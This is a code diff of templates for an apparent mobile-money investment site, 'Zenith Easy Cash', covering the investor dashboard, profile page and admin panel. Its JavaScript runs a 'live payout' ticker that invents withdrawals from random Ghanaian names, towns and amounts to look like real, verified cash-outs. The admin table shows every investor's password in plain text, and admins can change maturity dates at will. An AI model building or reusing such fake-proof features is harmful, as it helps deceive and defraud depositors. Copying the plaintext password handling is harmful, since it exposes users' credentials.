+                                <span id="withdrawalTimer_{{ loop.index0 }}" style="font-family:monospace; background:#e0f2fe; padding:2px 6px; border-radius:4px;">Loading...</span>
                             </span>
                         {% elif inv.status == 'Withdrawn Completed' %}
-                            <span style="color: #16a34a; font-weight: 600;">✅ Completed & Paid Out (Capital + Profit)</span>
+                            <span style="color: #15803d; font-weight: bold;">✅ Completed & Paid Out (Capital + Profit)</span>
                         {% else %}
-                            <span style="color: #475569; font-weight: 600;">{{ inv.status }}</span>
+                            <span style="color: #555; font-weight: bold;">{{ inv.status }}</span>
                         {% endif %}
                     </p>
                     
@@ -674,12 +616,12 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                             Number: <b>{{ settings.momo_number }}</b> | Name: <b>{{ settings.momo_name }}</b><br>
                             <small>Send payment first before uploading proof below!</small>
                         </div>
-                        <label style="font-size:11px;">Top-Up Amount (GHs):</label>
-                        <input type="number" name="topup_amount" min="200" step="1" required placeholder="Enter amount (Min 200 GHs)" style="padding:8px; margin-bottom:8px; width:100%; box-sizing:border-box; background:#ffffff; font-size:12px;">
-                        <input type="text" name="topup_proof" placeholder="MoMo Transaction ID" style="padding:8px; margin-bottom:8px; font-size:11px; width:100%; box-sizing:border-box; background:#ffffff;">
-                        <label style="font-size:11px; color:#475569; font-weight:600;">Upload Screenshot Receipt:</label>
-                        <input type="file" name="topup_screenshot" accept="image/*" style="font-size:11px; margin-bottom:8px; background:transparent;">
-                        <button type="submit" style="background:#059669; color:white; border:none; padding:10px; width:100%; font-weight:600; border-radius:6px; cursor:pointer; font-size:12px;">Submit Top-Up for Confirmation</button>
+                        <label style="font-size:12px;">Top-Up Amount (GHs):</label>
+                        <input type="number" name="topup_amount" min="200" step="1" required placeholder="Enter amount (Min 200 GHs)" style="padding:8px; margin-bottom:8px; width:100%; box-sizing:border-box;">
+                        <input type="text" name="topup_proof" placeholder="MoMo Transaction ID" style="padding:8px; margin-bottom:8px; font-size:12px; width:100%; box-sizing:border-box;">
+                        <label style="font-size:11px; color:#555;">Upload Screenshot Receipt:</label>
+                        <input type="file" name="topup_screenshot" accept="image/*" style="font-size:11px; margin-bottom:8px;">
+                        <button type="submit" style="background:#2e7d32; color:white; border:none; padding:10px; width:100%; font-weight:bold; border-radius:4px; cursor:pointer;">Submit Top-Up for Confirmation</button>
                     </form>
                     {% endif %}
 
@@ -689,17 +631,12 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                 </div>
                 {% endfor %}
             {% else %}
-                <p style="text-align:center; color:#64748b; padding:15px; font-size:13px;">No investment records found.</p>
+                <p style="text-align:center; color:#666;">No investment records found.</p>
             {% endif %}
         </div>
 
-        <!-- ZENITH WITHDRAWALS LIVE TICKER FEED (COMPACT & CLEAR) -->
         <div class="sidebar-ticker">
-            <h3>
-                <span>🟢 Zenith Withdrawals</span>
-                <span style="font-size: 10px; background: rgba(0,255,102,0.2); color: #00ff66; padding: 2px 5px; border-radius: 4px;">LIVE</span>
-            </h3>
-            <p style="font-size: 11px; color: #cbd5e1; margin-top: 4px; margin-bottom: 12px;">Real-time mobile money payouts across Ghana.</p>
+            <h3 style="color: #00ff66; font-size: 15px; margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 8px;">🟢 Live Zenith Payout Feed</h3>
             <div id="sideTickerList"></div>
         </div>
     </div>
@@ -730,7 +667,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                     el.innerHTML = `⏳ Time Left: ${days}d ${hrs}h ${mins}m ${secs}s`;
                 } else {
                     el.innerHTML = `🎉 Maturity Reached! Ready for Withdrawal`;
-                    el.style.color = "#34d399";
+                    el.style.color = "#4ade80";
                 }
             });
         }
@@ -752,35 +689,32 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         updateTrackers();
         updateWithdrawalCountdowns();
 
-        const sideNames = ["Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Ama Serwaa", "Kwaku Duah"];
-        const sideTowns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani", "Ho", "Tema", "Koforidua", "Obuasi"];
+        // Expanded sidebar testimonial pool
+        const sideNames = [
+            "Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", 
+            "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Nana Ama Owusu", "Fiifi Atta Mills"
+        ];
+        const sideTowns = [
+            "Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", 
+            "Sunyani", "Ho", "Tema", "Koforidua", "Obuasi"
+        ];
         
         function addSideTickerItem() {
             const list = document.getElementById('sideTickerList');
             if (!list) return;
             const name = sideNames[Math.floor(Math.random() * sideNames.length)];
             const town = sideTowns[Math.floor(Math.random() * sideTowns.length)];
-            const amt = (Math.floor(Math.random() * 20) + 3) * 100 * 1.5;
+            // Broader payout range from GHs 450 up to GHs 7,500
+            const amt = (Math.floor(Math.random() * 30) + 3) * 100 * 1.5;
             
-            const now = new Date();
-            const timeString = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-
             const item = document.createElement('div');
             item.className = 'side-ticker-item';
-            item.innerHTML = `
-                <div>🟢 <b>${name}</b> (${town})</div>
-                <div style="margin-top: 4px;">Cashed out <span class="side-ticker-amount">GHs ${amt.toLocaleString()}</span> via MoMo</div>
-                <span class="side-ticker-time">Verified Payout • Today at ${timeString}</span>
-            `;
+            item.innerHTML = `<b>${name}</b> (${town})<br>Cashed out <b>GHs ${amt.toLocaleString()}</b> via MoMo`;
             list.prepend(item);
             if (list.children.length > 5) list.lastChild.remove();
         }
-        
-        // Pre-populate items immediately
-        for(let i=0; i<3; i++) {
-            addSideTickerItem();
-        }
-        setInterval(addSideTickerItem, 4500);
+        setInterval(addSideTickerItem, 5000);
+        addSideTickerItem();
     </script>
 </body>
 </html>
@@ -794,21 +728,18 @@ INVESTOR_PROFILE_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Investor Profile - Zenith Easy Cash</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f1f5f9; color: #1e293b; margin: 0; padding: 20px; box-sizing: border-box; }
-        * { box-sizing: border-box; }
-        .container { max-width: 550px; width: 100%; background: #ffffff; padding: 35px; margin: 40px auto; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
-        h2 { color: #047857; text-align: center; margin-top: 0; margin-bottom: 25px; }
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        .container { max-width: 550px; background: #fff; padding: 30px; margin: 40px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { color: #028a0f; text-align: center; margin-top: 0; }
         .back-link { margin-bottom: 20px; font-size: 14px; }
-        .back-link a { color: #059669; text-decoration: none; font-weight: 600; }
-        .back-link a:hover { text-decoration: underline; }
-        .profile-avatar-large { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid #059669; display: block; margin: 0 auto 15px auto; background: #e2e8f0; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
-        .form-group { margin-bottom: 18px; }
-        label { display: block; font-weight: 600; margin-bottom: 6px; font-size: 13px; color: #334155; }
-        input { width: 100%; padding: 11px 14px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 14px; background: #f8fafc; }
-        input:focus { outline: none; border-color: #10b981; background: #ffffff; box-shadow: 0 0 0 3px rgba(16,185,129,0.1); }
-        button { background: #059669; color: white; border: none; padding: 13px; width: 100%; font-size: 15px; border-radius: 6px; cursor: pointer; font-weight: 600; box-shadow: 0 4px 6px rgba(5,150,105,0.2); }
-        button:hover { background: #047857; }
-        .flash { background: #e0f2fe; color: #0369a1; padding: 12px; margin-bottom: 20px; border-radius: 6px; text-align: center; font-weight: 600; font-size: 13px; border: 1px solid #bae6fd; }
+        .back-link a { color: #028a0f; text-decoration: none; font-weight: bold; }
+        .profile-avatar-large { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid #2e7d32; display: block; margin: 0 auto 15px auto; background: #e2e8f0; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; font-size: 13px; }
+        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #1b5e20; }
+        .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -820,13 +751,13 @@ INVESTOR_PROFILE_TEMPLATE = """
           {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
         {% endwith %}
 
-        <div style="text-align: center; margin-bottom: 22px;">
+        <div style="text-align: center; margin-bottom: 20px;">
             {% if investor.profile_pic %}
                 <img src="{{ url_for('uploaded_file', filename=investor.profile_pic) }}" class="profile-avatar-large">
             {% else %}
                 <img src="{{ default_avatar_svg }}" class="profile-avatar-large">
             {% endif %}
-            <p style="margin: 0; font-size: 13px; color: #64748b;">Default Human Head Avatar Active (Change below anytime)</p>
+            <p style="margin: 0; font-size: 14px; color: #64748b;">Default Human Head Avatar Active (Change below anytime)</p>
         </div>
 
         <form action="{{ url_for('update_profile') }}" method="POST" enctype="multipart/form-data">
@@ -836,7 +767,7 @@ INVESTOR_PROFILE_TEMPLATE = """
             </div>
             <div class="form-group">
                 <label>Phone Number (Locked):</label>
-                <input type="text" value="{{ investor.number }}" disabled style="background:#f1f5f9; color:#64748b;">
+                <input type="text" value="{{ investor.number }}" disabled style="background:#f1f5f9;">
             </div>
             <div class="form-group">
                 <label>Work / Job:</label>
@@ -848,7 +779,7 @@ INVESTOR_PROFILE_TEMPLATE = """
             </div>
             <div class="form-group">
                 <label>Upload/Change Profile Picture:</label>
-                <input type="file" name="profile_pic" accept="image/*" style="background:transparent; border:none; padding:0;">
+                <input type="file" name="profile_pic" accept="image/*">
             </div>
             <button type="submit">Save Profile Changes</button>
         </form>
@@ -863,16 +794,13 @@ ADMIN_LOGIN_TEMPLATE = """
 <head>
     <meta charset="UTF-8"><title>Admin Login</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f1f5f9; color: #1e293b; margin: 0; padding: 20px; box-sizing: border-box; }
-        * { box-sizing: border-box; }
-        .container { max-width: 420px; width: 100%; background: #ffffff; padding: 35px; margin: 80px auto; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
-        h2 { color: #047857; text-align: center; margin-top: 0; margin-bottom: 25px; }
-        .form-group { margin-bottom: 18px; }
-        label { display: block; font-weight: 600; margin-bottom: 6px; font-size: 13px; color: #334155; }
-        input { width: 100%; padding: 11px 14px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 14px; background: #f8fafc; }
-        input:focus { outline: none; border-color: #10b981; background: #ffffff; box-shadow: 0 0 0 3px rgba(16,185,129,0.1); }
-        button { background: #059669; color: white; border: none; padding: 13px; width: 100%; font-size: 15px; border-radius: 6px; cursor: pointer; font-weight: 600; box-shadow: 0 4px 6px rgba(5,150,105,0.2); }
-        button:hover { background: #047857; }
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        .container { max-width: 400px; background: #fff; padding: 30px; margin: 80px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { color: #028a0f; text-align: center; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; }
+        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -893,25 +821,20 @@ ADMIN_DASHBOARD_TEMPLATE = """
 <head>
     <meta charset="UTF-8"><title>Admin Dashboard</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f1f5f9; color: #1e293b; margin: 0; padding: 20px; box-sizing: border-box; overflow-x: auto; }
-        * { box-sizing: border-box; }
-        .container { max-width: 1250px; width: 100%; background: #ffffff; padding: 35px; margin: auto; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
-        h2 { color: #047857; float: left; margin-top: 0; font-size: 24px; }
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        .container { max-width: 1200px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { color: #028a0f; float: left; margin-top: 0; }
         .logout { float: right; }
-        .logout a { background: #ef4444; color: white; padding: 8px 16px; text-decoration: none; border-radius: 6px; font-weight: 600; font-size: 13px; transition: background 0.2s; }
-        .logout a:hover { background: #dc2626; }
-        .settings-box { background: #f8fafc; border: 1px solid #e2e8f0; padding: 20px; margin-bottom: 25px; border-radius: 8px; clear: both; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
-        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
-        th, td { padding: 12px; border: 1px solid #e2e8f0; text-align: left; font-size: 12px; }
-        th { background-color: #047857; color: white; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
-        tr:nth-child(even) { background-color: #f8fafc; }
-        .btn-action { background: #059669; color: white; padding: 6px 10px; text-decoration: none; border-radius: 4px; font-weight: 600; font-size: 11px; border: none; cursor: pointer; display: inline-block; margin: 2px; transition: background 0.2s; }
-        .btn-action:hover { background: #047857; }
-        .btn-payout { background: #dc2626; }
-        .btn-payout:hover { background: #b91c1c; }
-        img.proof-thumb { width: 45px; height: 45px; object-fit: cover; border-radius: 4px; border: 1px solid #cbd5e1; }
-        .edit-form { display: flex; gap: 6px; margin-top: 6px; align-items: center; }
-        .edit-form input { padding: 5px; font-size: 11px; width: 110px; border: 1px solid #cbd5e1; border-radius: 4px; background: #ffffff; }
+        .logout a { background: #c62828; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 14px; }
+        .settings-box { background: #fff8e1; border: 1px solid #ffa000; padding: 15px; margin-bottom: 25px; border-radius: 5px; clear: both; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; font-size: 12px; }
+        th { background-color: #2e7d32; color: white; }
+        .btn-action { background: #2e7d32; color: white; padding: 5px 8px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 11px; border: none; cursor: pointer; display: inline-block; margin: 2px;}
+        .btn-payout { background: #d32f2f; }
+        img.proof-thumb { width: 45px; height: 45px; object-fit: cover; border-radius: 4px; border: 1px solid #ccc; }
+        .edit-form { display: flex; gap: 4px; margin-top: 4px; align-items: center; }
+        .edit-form input { padding: 4px; font-size: 11px; width: 110px; }
     </style>
 </head>
 <body>
@@ -923,84 +846,82 @@ ADMIN_DASHBOARD_TEMPLATE = """
         </div>
 
         <div class="settings-box">
-            <h3 style="margin-top:0; color:#334155; font-size:15px;">⚙️ Update Company Payment Details</h3>
-            <form method="POST" action="{{ url_for('update_settings') }}" style="display: flex; gap: 15px; align-items: flex-end; flex-wrap: wrap;">
-                <div style="flex: 1; min-width: 200px;"><label style="font-size: 12px; font-weight:600; color:#334155;">MoMo Number:</label><input type="text" name="momo_number" value="{{ settings.momo_number }}" required style="padding: 9px; width: 100%; border:1px solid #cbd5e1; border-radius:6px; background:#ffffff;"></div>
-                <div style="flex: 2; min-width: 250px;"><label style="font-size: 12px; font-weight:600; color:#334155;">Account Name:</label><input type="text" name="momo_name" value="{{ settings.momo_name }}" required style="padding: 9px; width: 100%; border:1px solid #cbd5e1; border-radius:6px; background:#ffffff;"></div>
-                <div><button type="submit" style="background: #f59e0b; color: white; border: none; padding: 10px 18px; font-weight: 600; border-radius: 6px; cursor: pointer; box-shadow: 0 2px 4px rgba(245,158,11,0.2);">Update Details</button></div>
+            <h3>⚙️ Update Company Payment Details</h3>
+            <form method="POST" action="{{ url_for('update_settings') }}" style="display: flex; gap: 10px; align-items: flex-end;">
+                <div style="flex: 1;"><label style="font-size: 12px; font-weight:bold;">MoMo Number:</label><input type="text" name="momo_number" value="{{ settings.momo_number }}" required style="padding: 8px; width: 100%;"></div>
+                <div style="flex: 2;"><label style="font-size: 12px; font-weight:bold;">Account Name:</label><input type="text" name="momo_name" value="{{ settings.momo_name }}" required style="padding: 8px; width: 100%;"></div>
+                <div><button type="submit" style="background: #ffa000; color: white; border: none; padding: 9px 15px; font-weight: bold; border-radius: 4px; cursor: pointer;">Update Details</button></div>
             </form>
         </div>
 
-        <h3 style="color:#334155; font-size:16px; margin-top:30px;">Registered Investors & Portfolio Management</h3>
-        <div style="overflow-x: auto;">
-            <table>
-                <thead>
+        <h3>Registered Investors & Portfolio Management</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Investor Info</th>
+                    <th>Password Management</th>
+                    <th>Investment Slot Details</th>
+                    <th>Job / Region</th>
+                    <th>Maturity Time</th>
+                    <th>Status</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% if flat_investments %}
+                    {% for item in flat_investments %}
                     <tr>
-                        <th>Investor Info</th>
-                        <th>Password Management</th>
-                        <th>Investment Slot Details</th>
-                        <th>Job / Region</th>
-                        <th>Maturity Time</th>
-                        <th>Status</th>
-                        <th>Actions</th>
+                        <td><strong>{{ item.name }}</strong><br>{{ item.number }}</td>
+                        <td>
+                            <span><b>Pass:</b> {{ item.password }}</span>
+                            <form action="{{ url_for('update_password', parent_idx=item.parent_idx) }}" method="POST" class="edit-form">
+                                <input type="text" name="new_password" placeholder="New pass" required>
+                                <button type="submit" class="btn-action" style="background:#0284c7;">Reset</button>
+                            </form>
+                        </td>
+                        <td>
+                            <strong>GHs {{ "%.2f"|format(item.amount) }}</strong><br>
+                            <small style="color:#028a0f;">Return: GHs {{ "%.2f"|format(item.expected_return) }}</small><br>
+                            <small>ID: {{ item.transaction_id }}</small><br>
+                            {% if item.screenshot %}
+                                <a href="{{ url_for('uploaded_file', filename=item.screenshot) }}" target="_blank">
+                                    <img src="{{ url_for('uploaded_file', filename=item.screenshot) }}" class="proof-thumb">
+                                </a>
+                            {% endif %}
+                        </td>
+                        <td>{{ item.work }}<br><small>{{ item.region }}</small></td>
+                        <td>
+                            <span>{{ item.maturity_date }}</span>
+                            <form action="{{ url_for('update_maturity', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" class="edit-form">
+                                <input type="text" name="new_maturity" value="{{ item.maturity_date }}" required>
+                                <button type="submit" class="btn-action" style="background:#0284c7;">Set</button>
+                            </form>
+                        </td>
+                        <td><span style="color: #e65100; font-weight: bold;">{{ item.status }}</span></td>
+                        <td>
+                            {% if item.status == 'Pending Admin Payment Confirmation' %}
+                                <form action="{{ url_for('confirm_payment', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;">
+                                    <button type="submit" class="btn-action">Approve & Start Timer</button>
+                                </form>
+                            {% elif item.status == 'Withdrawal Requested' %}
+                                <form action="{{ url_for('complete_withdrawal', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;">
+                                    <button type="submit" class="btn-action btn-payout">Pay Out</button>
+                                </form>
+                            {% else %}
+                                <span>{{ item.status }}</span>
+                            {% endif %}
+                            
+                            <form action="{{ url_for('delete_slot', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete this investment slot?');">
+                                <button type="submit" class="btn-action" style="background:#6b7280;">Delete</button>
+                            </form>
+                        </td>
                     </tr>
-                </thead>
-                <tbody>
-                    {% if flat_investments %}
-                        {% for item in flat_investments %}
-                        <tr>
-                            <td><strong>{{ item.name }}</strong><br><span style="color:#64748b;">{{ item.number }}</span></td>
-                            <td>
-                                <span><b>Pass:</b> {{ item.password }}</span>
-                                <form action="{{ url_for('update_password', parent_idx=item.parent_idx) }}" method="POST" class="edit-form">
-                                    <input type="text" name="new_password" placeholder="New pass" required>
-                                    <button type="submit" class="btn-action" style="background:#0284c7;">Reset</button>
-                                </form>
-                            </td>
-                            <td>
-                                <strong>GHs {{ "%.2f"|format(item.amount) }}</strong><br>
-                                <small style="color:#059669; font-weight:600;">Return: GHs {{ "%.2f"|format(item.expected_return) }}</small><br>
-                                <small style="color:#64748b;">ID: {{ item.transaction_id }}</small><br>
-                                {% if item.screenshot %}
-                                    <a href="{{ url_for('uploaded_file', filename=item.screenshot) }}" target="_blank">
-                                        <img src="{{ url_for('uploaded_file', filename=item.screenshot) }}" class="proof-thumb" style="margin-top:4px;">
-                                    </a>
-                                {% endif %}
-                            </td>
-                            <td>{{ item.work }}<br><small style="color:#64748b;">{{ item.region }}</small></td>
-                            <td>
-                                <span>{{ item.maturity_date }}</span>
-                                <form action="{{ url_for('update_maturity', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" class="edit-form">
-                                    <input type="text" name="new_maturity" value="{{ item.maturity_date }}" required>
-                                    <button type="submit" class="btn-action" style="background:#0284c7;">Set</button>
-                                </form>
-                            </td>
-                            <td><span style="color: #d97706; font-weight: 600;">{{ item.status }}</span></td>
-                            <td>
-                                {% if item.status == 'Pending Admin Payment Confirmation' %}
-                                    <form action="{{ url_for('confirm_payment', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;">
-                                        <button type="submit" class="btn-action">Approve & Start</button>
-                                    </form>
-                                {% elif item.status == 'Withdrawal Requested' %}
-                                    <form action="{{ url_for('complete_withdrawal', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;">
-                                        <button type="submit" class="btn-action btn-payout">Pay Out</button>
-                                    </form>
-                                {% else %}
-                                    <span style="color:#64748b;">{{ item.status }}</span>
-                                {% endif %}
-                                
-                                <form action="{{ url_for('delete_slot', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete this investment slot?');">
-                                    <button type="submit" class="btn-action" style="background:#64748b;">Delete</button>
-                                </form>
-                            </td>
-                        </tr>
-                        {% endfor %}
-                    {% else %}
-                        <tr><td colspan="7" style="text-align: center; color: #64748b; padding: 20px;">No registrations found.</td></tr>
-                    {% endif %}
-                </tbody>
-            </table>
-        </div>
+                    {% endfor %}
+                {% else %}
+                    <tr><td colspan="7" style="text-align: center; color: #666;">No registrations found.</td></tr>
+                {% endif %}
+            </tbody>
+        </table>
     </div>
 </body>
 </html>
